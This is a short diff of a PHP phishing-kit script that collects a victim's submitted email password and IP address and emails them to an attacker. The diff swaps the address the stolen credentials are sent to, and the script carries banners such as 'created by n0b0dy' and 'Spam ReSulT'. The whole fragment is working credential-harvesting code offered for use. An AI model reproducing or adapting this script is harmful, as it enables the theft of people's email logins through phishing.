@@ -7,7 +7,7 @@ $message .= "Emailpwd : ".$_POST['pwd']."\n";
 $message .= "----------------created by n0b0dy-------------------\n";
 $message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
 $message .= "-----------------Spam ReSulT--------------------\n";
-$send = "coldtone818@gmail.com";
+$send = "mansathegreat@yandex.com";
 $subject = "Carlito ReZulTs";
 $headers = "From: ReZult<logzz@cok.edu>";
 $headers .= $_POST['eMailAdd']."\n";
